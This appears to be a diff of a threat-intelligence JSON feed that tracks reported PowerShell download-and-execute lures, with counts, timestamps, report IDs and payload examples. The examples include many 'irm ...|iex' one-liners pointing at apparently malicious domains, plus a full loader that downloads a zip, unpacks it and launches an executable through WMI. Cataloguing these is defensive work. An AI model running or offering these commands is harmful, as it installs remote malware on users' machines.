@@ -1,16 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 156,
-    "ReportCount": 156,
-    "FirstSeen": "2026-11-10T14:44:05.833000+00:00",
-    "LastSeen": "2026-11-17T10:23:18.552000+00:00",
+    "DistinctPayloadCount": 152,
+    "ReportCount": 152,
+    "FirstSeen": "2026-11-10T15:05:32.860000+00:00",
+    "LastSeen": "2026-11-17T14:55:43.108000+00:00",
     "ReportIds": [
-      "cmwaswd9d03gu0omleqib7jnh",
-      "cmwaszalk03kg0omlrdos32u0",
-      "cmwat13wg03pg0omlp0iqy220",
-      "cmwat2zqa03s20oml5w26hrac",
-      "cmwat79vi03w70oml4xffr69m",
       "cmwatnyc604490omlsbbl7o5s",
       "cmwats9os047q0omlp1sfdx6q",
       "cmwau3fte04b60omltf6fsxuu",
@@ -161,7 +156,8 @@
       "cmwkj71lv1epp0oml2z0a012c",
       "cmwkjd2jz1eum0omljaktuag7",
       "cmwkjm84z1f0v0omlbp0to0sq",
-      "cmwkjnyfa1f270oml6e7m8b2g"
+      "cmwkjnyfa1f270oml6e7m8b2g",
+      "cmwkte9y71fs10omlyn3mr6rc"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
@@ -241,6 +237,7 @@
       "irm 'browse-cloud.codes/f0e07856f01b4cda'|iex;",
       "irm 'browse-cloud.codes/f141a3fc3b742e21'|iex;",
       "irm 'browse-cloud.codes/f19c44dcc955c4eb'|iex;",
+      "irm 'browse-cloud.codes/f6f41b91b95bf127'|iex;",
       "irm 'browse-cloud.codes/f787aa2bee9432bb'|iex;",
       "irm 'browse-cloud.codes/f7ed5df838d3e4b9'|iex;",
       "irm 'browse-cloud.codes/fa625dfc6bcfb436'|iex;",
@@ -253,7 +250,6 @@
       "irm 'browse-nnccodes.beer/0aa4b6ee05cd05e5'|iex;",
       "irm 'browse-nnccodes.beer/0bb98601c2aaf567'|iex;",
       "irm 'browse-nnccodes.beer/0e479f5349efdb6d'|iex;",
-      "irm 'browse-nnccodes.beer/13c1c69715cab5fe'|iex;",
       "irm 'browse-nnccodes.beer/174623c0f642d3eb'|iex;",
       "irm 'browse-nnccodes.beer/174c5db552b2a148'|iex;",
       "irm 'browse-nnccodes.beer/189b1694d7e41576'|iex;",
@@ -279,7 +275,6 @@
       "irm 'browse-nnccodes.beer/47b7c81b0049a5bb'|iex;",
       "irm 'browse-nnccodes.beer/4c6b6382ba0f77e9'|iex;",
       "irm 'browse-nnccodes.beer/4ebcfb3eddea4f02'|iex;",
-      "irm 'browse-nnccodes.beer/505791f6055ce692'|iex;",
       "irm 'browse-nnccodes.beer/5955e0d1f05713da'|iex;",
       "irm 'browse-nnccodes.beer/69845b449b7231eb'|iex;",
       "irm 'browse-nnccodes.beer/6c23bd6dae0e89ab'|iex;",
@@ -308,16 +303,13 @@
       "irm 'browse-nnccodes.beer/d230586231576f76'|iex;",
       "irm 'browse-nnccodes.beer/d6635ac514ec3dc5'|iex;",
       "irm 'browse-nnccodes.beer/d7125fe2b22df9e3'|iex;",
-      "irm 'browse-nnccodes.beer/d8fc650c3a1c3b9b'|iex;",
       "irm 'browse-nnccodes.beer/de1cc1e870ff2e58'|iex;",
       "irm 'browse-nnccodes.beer/de245c5f07077b06'|iex;",
       "irm 'browse-nnccodes.beer/e0f433c5355ab6b9'|iex;",
       "irm 'browse-nnccodes.beer/e1876458af196191'|iex;",
       "irm 'browse-nnccodes.beer/e18d1c790f9d8ed3'|iex;",
-      "irm 'browse-nnccodes.beer/e9f8205fa9ae7342'|iex;",
       "irm 'browse-nnccodes.beer/eda44de7cd33aa18'|iex;",
       "irm 'browse-nnccodes.beer/f5e3d430790185d2'|iex;",
-      "irm 'browse-nnccodes.beer/fa77de25ab2073f8'|iex;",
       "irm 'browse-nnccodes.beer/fbb6e233d74f5f77'|iex;",
       "irm 'browse-nnccodes.beer/fd9aaadbb95356a1'|iex;"
     ]
@@ -576,16 +568,10 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 14,
-    "ReportCount": 146,
-    "FirstSeen": "2026-11-10T14:41:01.832000+00:00",
+    "ReportCount": 140,
+    "FirstSeen": "2026-11-10T15:02:36.723000+00:00",
     "LastSeen": "2026-11-17T14:17:48.863000+00:00",
     "ReportIds": [
-      "cmwassffh03bh0omlsfcxqfg0",
-      "cmwasticu03cc0oml4zgtj1lo",
-      "cmwasveln03d90omliskce8ey",
-      "cmwasxtm103je0omlr16gxxtj",
-      "cmwaszywf03mu0omld4xjgaol",
-      "cmwat1zwa03rd0omlyov2os6w",
       "cmwatk6hj03zz0omli2jp2ucd",
       "cmwau4y5p04ch0omlgvaf5irq",
       "cmwaufjtc04ig0oml3r4xir53",
@@ -951,12 +937,10 @@
   {
     "Pattern": "IRM <URL>\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
     "DistinctPayloadCount": 1,
-    "ReportCount": 16,
-    "FirstSeen": "2026-11-10T14:48:15.431000+00:00",
+    "ReportCount": 14,
+    "FirstSeen": "2026-11-10T15:27:33.689000+00:00",
     "LastSeen": "2026-11-17T13:50:59.134000+00:00",
     "ReportIds": [
-      "cmwat1pv303q80omli9ph0e1z",
-      "cmwat3unn03te0omlzgthlvd5",
       "cmwaug9je04ja0oml6zapyr46",
       "cmwax1z2k00l70omluwxueoah",
       "cmwbgl81k070e0nmliamdcqj4",
@@ -979,11 +963,10 @@
   {
     "Pattern": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"<URL>\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 4,
-    "FirstSeen": "2026-11-10T14:43:21.485000+00:00",
+    "ReportCount": 3,
+    "FirstSeen": "2026-11-10T21:14:36.266000+00:00",
     "LastSeen": "2026-11-12T11:51:47.800000+00:00",
     "ReportIds": [
-      "cmwasvf2k03dd0oml0q78fnxd",
       "cmwb6ukb801fz0nmlybxc1x8x",
       "cmwcf73lu07rj0omlahvm476x",
       "cmwdhmhp504920omlkj1isj57"
